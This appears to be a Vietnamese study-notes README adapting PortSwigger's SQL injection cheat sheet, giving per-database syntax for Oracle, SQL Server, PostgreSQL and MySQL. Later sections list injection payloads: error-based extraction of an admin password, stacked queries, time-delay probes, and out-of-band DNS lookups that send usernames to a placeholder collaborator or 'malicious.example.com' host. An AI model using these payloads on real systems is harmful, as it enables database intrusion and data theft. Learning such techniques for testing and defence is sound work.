- tài liệu: https://portswigger.net/web-security/sql-injection/cheat-sheet<br>

I. String concatenation<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/145b0058-519e-4a4b-8698-0c08864c3834)<br>

- có 1 cột first_name, 1 cột last_name -> tạo 1 cột full_name từ bảng employees<br>
1. Oracle<br>
- SELECT first_name || ' ' || last_name AS full_name FROM employees;<br>
2. Microsoft SQL Server<br>
- SELECT first_name + ' ' + last_name AS full_name FROM employees;<br>
3. PostgreSQL<br>
SELECT first_name || ' ' || last_name AS full_name FROM employees;<br>
4. MySQL<br>
- SELECT first_name ' ' last_name AS full_name FROM employees;
- SELECT CONCAT(first_name, ' ', last_name) AS full_name FROM employees;<br>

II. Substring<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/36d0e1a4-d393-4766-b436-3a9ec330fc30)<br>

- có 1 bảng employees với cột employee_code có dạng EMP123456 -> bạn lấy phần số bỏ phần chữ<br>
1. Oracle<br>
- SELECT SUBSTR(employee_code, 4, 6) AS employee_number FROM employees;<br>
2. Microsoft SQL Server<br>
- SELECT SUBSTRING(employee_code, 4, 6) AS employee_number FROM employees;<br>
3. PostgreSQL<br>
- SELECT SUBSTRING(employee_code FROM 4 FOR 6) AS employee_number FROM employees;<br>
4. MySQL<br>
- SELECT SUBSTRING(employee_code, 4, 6) AS employee_number FROM employees;<br>

III. Comments<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/93da62be-edba-41e4-997b-b18a5575d310)<br>

- dùng để ghi chú, giải thích hay tạm dừng 1 phần của truy vấn<br>
1. Oracle<br>
- Bình luận dòng đơn: SELECT * FROM employees -- Đây là một bình luận
- Bình luận khối: SELECT * FROM employees /* Đây là một bình luận */<br>
2. Microsoft SQL Server<br>
- Bình luận dòng đơn: SELECT * FROM employees -- Đây là một bình luận
- Bình luận khối: SELECT * FROM employees /* Đây là một bình luận */<br>
3. PostgreSQL<br>
- Bình luận dòng đơn: SELECT * FROM employees -- Đây là một bình luận
- Bình luận khối: SELECT * FROM employees /* Đây là một bình luận */<br>
4. MySQL<br>
- Bình luận dòng đơn với #: SELECT * FROM employees # Đây là một bình luận
- Bình luận dòng đơn với --: SELECT * FROM employees -- Đây là một bình luận
- Bình luận khối: SELECT * FROM employees /* Đây là một bình luận */<br>

IV. Database version<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/3c8d947a-2fdd-48c2-8f83-11ec16146620)<br>

- xác định loại và phiên bản của hệ quản trị database đang xài<br>
1. Oracle<br>
- SELECT banner FROM v$version;
- SELECT version FROM v$instance;<br>
2. Microsoft SQL Server<br>
- SELECT @@version;<br>
3. PostgreSQL<br>
- SELECT version();<br>
4. MySQL<br>
- SELECT @@version;<br>

V. Database contents<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/1892af28-2eec-4be2-b58a-ca20facaf554)<br>

- liệt kê các bảng và cột trong databse <br>
1. Oracle<br>
- Liệt kê tất cả các bảng có trong cơ sở dữ liệu: SELECT * FROM all_tables;
- Xem các cột của bảng "products": SELECT * FROM all_tab_columns WHERE table_name = 'products';<br>
2. Microsoft SQL Server<br>
- Liệt kê tất cả các bảng có trong cơ sở dữ liệu: SELECT * FROM information_schema.tables;
- Xem các cột của bảng "products": SELECT * FROM information_schema.columns WHERE table_name = 'products';<br>
3. PostgreSQL<br>
- Liệt kê tất cả các bảng có trong cơ sở dữ liệu: SELECT * FROM information_schema.tables;
- Xem các cột của bảng "products": SELECT * FROM information_schema.columns WHERE table_name = 'products';<br>
4. MySQL<br>
- Liệt kê tất cả các bảng có trong cơ sở dữ liệu: SELECT * FROM information_schema.tables;
- Xem các cột của bảng "products": SELECT * FROM information_schema.columns WHERE table_name = 'products';<br>

VI. Conditional errors<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/4da157cb-6f07-4bb7-82ad-a8410161caf4)<br>

- check 1 đk bool và kích hoạt lỗi database nếu đk đó đúng
- Giả sử bạn muốn tạo lỗi nếu giá trị của cột age lớn hơn 100.
1. Oracle<br>
- SELECT CASE WHEN (age > 100) THEN TO_CHAR(1/0) ELSE NULL END FROM dual;<br>
2. Microsoft SQL Server<br>
- SELECT CASE WHEN (age > 100) THEN 1/0 ELSE NULL END;<br>
3. PostgreSQL<br>
- 1 = (SELECT CASE WHEN (age > 100) THEN 1/(SELECT 0) ELSE NULL END);<br>
4. MySQL<br>
- SELECT IF(age > 100, (SELECT table_name FROM information_schema.tables), 'a');<br>

VII. Extracting data via visible error messages<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/8afa5dab-25c4-4ea3-bc56-cd091d21a23e)<br>

- khai thác data qua thông báo lỗi<br>
1. Microsoft SQL Server<br>
- SELECT 'foo' WHERE 1 = (SELECT password FROM users WHERE username = 'admin');<br>
2. PostgreSQL<br>
- SELECT CAST((SELECT password FROM users WHERE username = 'admin') AS int);<br>
3. MySQL<br>
- SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users WHERE username = 'admin')));<br>

VIII. Batched (or stacked) queries<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/f42c8d81-b59f-4f8f-86a6-fa8c66b8e22d)<br>

- thực hiện tiêm hàng loạt truy vấn, can dùng để khai thác lỗ hổng mù<br>
1. Microsoft SQL Server<br>
- SELECT * FROM users; WAITFOR DELAY '00:00:10';<br>
2. PostgreSQL<br>
- SELECT * FROM users; SELECT 1/(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 0 ELSE 1 END);<br>
3. MySQL<br>
- SELECT * FROM users; SELECT LOAD_FILE('\\\\malicious.example.com\\abc');<br>

IX. Time delays<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/ce9b9e14-1417-4a0b-871b-258d6901af7b)<br>

- tạo độ trễ thời gian khi truy vấn đc xử lý trong database, check app có ảnh hưởng bởi tiêm SQL ko (VD: 10s)<br>
1. Oracle<br>
```
BEGIN
  dbms_pipe.receive_message(('a'),10);
END;
```
<br>
2. Microsoft SQL Server<br>
- WAITFOR DELAY '0:0:10';<br>
3. PostgreSQL<br>
- SELECT pg_sleep(10);<br>
4. MySQL<br>
- SELECT SLEEP(10);<br>

X. Conditional time delays<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/d1999fc4-d4ad-4bf0-b144-a3883110f0fe)<br>

- check 1 đk bool và kích hoạt độ trễ thời gian nếu đk đúng, check app bị SQL ảnh hưởng ko
- Giả sử bạn muốn tạo độ trễ nếu giá trị của cột age lớn hơn 100.<br>
1. Oracle<br>
- SELECT CASE WHEN (age > 100) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;<br>
2. Microsoft SQL Server<br>
- IF (age > 100) WAITFOR DELAY '0:0:10';<br>
3. PostgreSQL<br>
- SELECT CASE WHEN (age > 100) THEN pg_sleep(10) ELSE pg_sleep(0) END;<br>
4. MySQL<br>
- SELECT IF(age > 100, SLEEP(10), 'a');<br>

XI. DNS lookup<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/4e1707c7-3cef-474b-97be-72bcc86aaf21)<br>

- Bạn có thể khiến cơ sở dữ liệu thực hiện một tra cứu DNS tới một miền ngoài. Để làm điều này, bạn sẽ cần sử dụng Burp Collaborator
 để tạo ra một tên miền con độc nhất của Burp Collaborator mà bạn sẽ sử dụng trong cuộc tấn công, sau đó kiểm tra máy chủ Collaborator để xác nhận rằng một tra cứu DNS đã xảy ra.<br>
1. Oracle<br>
- Trong Oracle, bạn có thể sử dụng lỗ hổng XXE để kích hoạt tra cứu DNS. Mặc dù lỗ hổng này đã được vá, nhưng vẫn có nhiều cài đặt Oracle chưa được vá:
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://your-collaborator-subdomain.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual;
- Phương pháp sau đây hoạt động trên các cài đặt Oracle đã được vá đầy đủ, nhưng yêu cầu quyền cao hơn: SELECT UTL_INADDR.get_host_address('your-collaborator-subdomain.burpcollaborator.net');<br>
2. Microsoft SQL Server<br>
- exec master..xp_dirtree '//your-collaborator-subdomain.burpcollaborator.net/a';<br>
3. PostgreSQL<br>
- copy (SELECT '') to program 'nslookup your-collaborator-subdomain.burpcollaborator.net';<br>
4. MySQL<br>
- LOAD_FILE('\\\\your-collaborator-subdomain.burpcollaborator.net\\a');
- SELECT 'test' INTO OUTFILE '\\\\your-collaborator-subdomain.burpcollaborator.net\\a';<br>

XII. DNS lookup with data exfiltration<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/1ebed1cf-7fbc-440b-b91d-888461a73d37)<br>

- Bạn có thể khiến cơ sở dữ liệu thực hiện một tra cứu DNS tới một miền ngoài chứa kết quả của một truy vấn bị tiêm vào. Để làm điều này, bạn sẽ cần sử dụng Burp Collaborator để tạo ra một tên miền con
 độc nhất của Burp Collaborator mà bạn sẽ sử dụng trong cuộc tấn công, sau đó kiểm tra máy chủ Collaborator để lấy chi tiết của bất kỳ tương tác DNS nào, bao gồm dữ liệu bị rò rỉ.<br>
 1. Oracle<br>
 - SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT username FROM users WHERE ROWNUM=1) || '.your-collaborator-subdomain.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual;<br>
 2. Microsoft SQL Server<br>
 - declare @p varchar(1024);set @p=(SELECT username FROM users WHERE id=1);exec('master..xp_dirtree "//'+@p+'.your-collaborator-subdomain.burpcollaborator.net/a"');<br>
 3. PostgreSQL<br>
 ```
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT username FROM users LIMIT 1);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.your-collaborator-subdomain.burpcollaborator.net''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```
<br>
4. MySQL<br>
SELECT username FROM users LIMIT 1 INTO OUTFILE '\\\\your-collaborator-subdomain.burpcollaborator.net\\a';<br>
